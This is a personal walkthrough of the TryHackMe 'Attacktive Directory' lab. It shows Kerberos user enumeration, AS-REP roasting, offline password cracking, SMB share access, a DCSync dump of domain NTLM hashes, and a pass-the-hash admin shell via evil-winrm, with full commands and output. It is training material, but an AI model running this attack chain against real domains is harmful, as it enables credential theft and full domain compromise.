---
title: "TryHackMe Attacktive Directory Walkthrough - Active Directory Exploitation Guide"
description: "Complete walkthrough of TryHackMe's Attacktive Directory room. Learn Active Directory attacks, Kerberos exploitation, and Windows domain security assessment."
keywords: ["tryhackme attacktive directory", "active directory attacks", "kerberos exploitation", "domain attacks", "windows security", "ad exploitation"]
tags: ["tryhackme", "active-directory", "kerberos", "domain-attacks", "windows"]
sidebar_position: 8
---

:::info Description

These are my notes for the ["Attacktive Directory"](https://tryhackme.com/room/attacktivedirectory) Room on TryHackMe. This was a walk-through styled room so all the instructions were there, these are just my notes.

Credits: S/o to hunterbot for the assist, and Doxum and Noodles for hanging out no the stream :)

|OS|Level|Rating
|:---:|:-----:|:-----:|
|Windows|Medium|3/5|

:::

The room says we need to install the following:

* bloodhound & neo4j
* impacket
* [kerbrute](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64)

## RECON

### Scan

No network scanning this time, we know its Active Directory so straight to enumeration.

### Enumerate

smb enumeration: `enum4linux -U -M 10.10.75.101`

install kerbrute, download the THM provided `userlist.txt` and `passwordlist.txt`:

run: `kerbrute userenum --dc $AD_IP -d THM-AD userlist.txt` to check which usernames in our list are VALID

```bash
└─$ kerbrute userenum --dc 10.10.75.101 -d THM-AD userlist.txt                                              1 ⨯ 1 ⚙

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/15/22 - Ronnie Flathers @ropnop

2022/03/15 21:43:16 >  Using KDC(s):
2022/03/15 21:43:16 >   10.10.75.101:88

2022/03/15 21:43:17 >  [+] VALID USERNAME:       james@THM-AD
2022/03/15 21:43:22 >  [+] VALID USERNAME:       svc-admin@THM-AD
2022/03/15 21:43:28 >  [+] VALID USERNAME:       James@THM-AD
2022/03/15 21:43:30 >  [+] VALID USERNAME:       robin@THM-AD
2022/03/15 21:43:55 >  [+] VALID USERNAME:       darkstar@THM-AD
2022/03/15 21:44:09 >  [+] VALID USERNAME:       administrator@THM-AD
2022/03/15 21:44:39 >  [+] VALID USERNAME:       backup@THM-AD
2022/03/15 21:44:53 >  [+] VALID USERNAME:       paradox@THM-AD
2022/03/15 21:46:21 >  [+] VALID USERNAME:       JAMES@THM-AD
2022/03/15 21:46:52 >  [+] VALID USERNAME:       Robin@THM-AD
2022/03/15 21:49:51 >  [+] VALID USERNAME:       Administrator@THM-AD
2022/03/15 21:55:51 >  [+] VALID USERNAME:       Darkstar@THM-AD
```

With this list of valid usernames, we want to find which users have the `UF_DONT_REQUIRE_PREAUTH` flag set.

:::info UF_DONT_REQUIRE_PREAUTH?

Why we want to find users with this flag set:

_"...there is a vulnerable option available for Kerberos users: ‘Do not require Kerberos preauthentication’ (UF_DONT_REQUIRE_PREAUTH). When pre-authentication is enabled, a time stamp is encrypted using the user’s password hash as an encryption key. If the KDC reads a valid time while using the user’s hash to decrypt the time stamp, the KDC knows that the request isn’t a replay of the previous request._

_If pre-authentication is disabled, an attacker can send a request for authentication. The KDC will return an encrypted TGT from which an attacker can retrieve the vulnerable user’s hash and crack it offline. The hash is in krb5asrep format."_

credits: [Alex Fox](https://foxed.github.io/GetNPUsers/)
:::

Let's use `impacket-GetNPUsers` (from your terminal with `impacket` installed):

`impacket-GetNPUsers -outputfile $OUTPUT_FILE -usersfile $INPUT_FILE -debug -dc-ip $AD_IP $DOMAIN/`

```bash
$ impacket-GetNPUsers -outputfile kerb-user.txt -usersfile user-1.txt -debug -dc-ip 10.10.75.101 thm-ad/
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /home/kali/.local/lib/python3.9/site-packages/impacket
[+] Trying to connect to KDC at 10.10.75.101
[-] User james@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.75.101
[+] Trying to connect to KDC at 10.10.75.101
[-] User James@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.75.101
[-] User robin@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.75.101
[-] User darkstar@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.75.101
[-] User administrator@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.75.101
[-] User backup@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.75.101
[-] User paradox@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.75.101
[-] User JAMES@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.75.101
[-] User Robin@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.75.101
[-] User Administrator@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] Trying to connect to KDC at 10.10.75.101
[-] User Darkstar@THM-AD doesn't have UF_DONT_REQUIRE_PREAUTH set
```

let that run and check `$OUTPUT_FILE` for any successful usernames:

```bash
$ cat kerb-user.txt
$krb5asrep$23$svc-admin@THM-AD@THM-AD:58f9aec0401e1853c840af5f369ac610$8efe1b2bb5373788a670aaa6ff41aead7359c0d5530ee970a34a22e54411d646d9bccc30d67efbe06e0774d9b8caf6a227ea8716307d006d937d0dc2bb449558292096b6fa84cedad7201bfc2c3ebe43e1ebf1fb0e1124dbe8089aadd8739683a3e638690eddc4667381457d34537cb5a6093d1f08d3bc04faafc57434d0105d4c00c0c6084af6f88a65a9e0159ae26ff036793bb9501d29003231f68089b4706c9efff58f366cafae0c6b4e08443fe36d9c9e858c6276c263ac76e8dc51bc856887433f33203aaf40053c19a4fecb42b7987a4036dbff228b370f70d3e5acd8c0047f6942a673a5e5
```

:::tip ASREPRoast TIP

If you use the latest version of kerbrute it can do `ASREPRoast` at the same time as evaluating valid usernames.

:::

## CRACK

Use `hashid -jm <hash />` to lookup hash type.

:::tip Hashcat TIP

_Lookup hashchat [examples](https://hashcat.net/wiki/doku.php?id=example_hashes) for all things hash._

:::

Details about our hash:

|Hash-Mode|Hash-Name|Hash|
|:----|:----|:----|
|18200|Kerberos 5, etype 23, AS-REP|`$krb5asrep$23$user@domain.com:3e156a...`|

hash-mode = `18200`

### john the ripper

Let's crack it with `john`: `john --wordlist=$WORDLIST $HASH_FILE`

```bash
─$ john --wordlist=./passwordlist.txt kerb-user.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@THM-AD@THM-AD)
1g 0:00:00:01 DONE (2022-03-15 22:22) 0.9433g/s 6279p/s 6279c/s 6279C/s shearer..amy123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/ATTACKTIVE]
└─$ john --show kerb-user.txt
$krb5asrep$23$svc-admin@THM-AD@THM-AD:management2005

1 password hash cracked, 0 left
```

:::tip 0reoByte TIP

_"if you want to look back at a hash cracked by john without the john command you could check the pots file in the .john directory in your home dir (0reoByte)"_

:::

## ACCESS

Now that we have a valid username and password we cracked, we enumerate again with the credentials and see what we can get

### smbclient

Let's use `smbclient` to access the `backup` share we found from before:

`$ smbclient -L //$AD_IP/$SHARE -U $username -P $password`

```bash
└─$ smbclient //10.10.81.46/backup -U svc-admin
Enter WORKGROUP\svc-admin's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr  5 07:08:39 2020
  ..                                  D        0  Sun Apr  5 07:08:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 07:08:53 2020

                8247551 blocks of size 4096. 3578209 blocks available
smb: \>
```

Download and decode the credentials found in `backup_credentials.txt`:

```bash
$ echo YmFja3VwQHNwb*************XAyNTE2ODYw | base64 -d
backup@*********.local:*************
```

### impacket scripts

Use `impacket-secretsdump` to dump all secrets from the AD via the valid backup credentials you just found:

`$ impacket-secretsdump -just-dc-user $username $domain/$username:$password@$AD_IP`

_note: `$username` and `$domain` here are the ones from the credentials file we decrypted._

```bash
└─$ impacket-secretsdump -just-dc-user backup *********.local/backup:************* @10.10.81.46
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
[*] Kerberos keys grabbed
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
[*] Cleaning up...
```

That was using the `-just-dc-user` switch.

Using `-just-dc-ntlm` gets much better results:

```bash
─$ impacket-secretsdump -just-dc-ntlm *********.local/backup:************* @10.10.81.46
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:********************************:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:********************************:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:5d1d45d31626d9cc165f2dbae119d4d3:::
[*] Cleaning up...
```

Admin 32bit hash = `********************************`

### evil-winrm

Now we use [evil-winrm](https://github.com/Hackplayers/evil-winrm) aka the "Windows Remote Management" shell, to get an Admin-level shell on the AD box:

`$ evil-winrm -u $ADMIN_USERNAME -H $ADMIN_HASH -i $AD_IP`

```bash
└─$ evil-winrm -u Administrator -H ******************************** -i 10.10.81.46

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

We have an Admin shell.

Find the 3 x flags.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
TryHackMe{*********************}

Evil-WinRM* PS C:\Users> type backup\Desktop\PrivEsc.txt
TryHackMe{***************}

*Evil-WinRM* PS C:\Users> type svc-admin\Desktop\user.txt.txt
TryHackMe{*****************}
```

Game over.
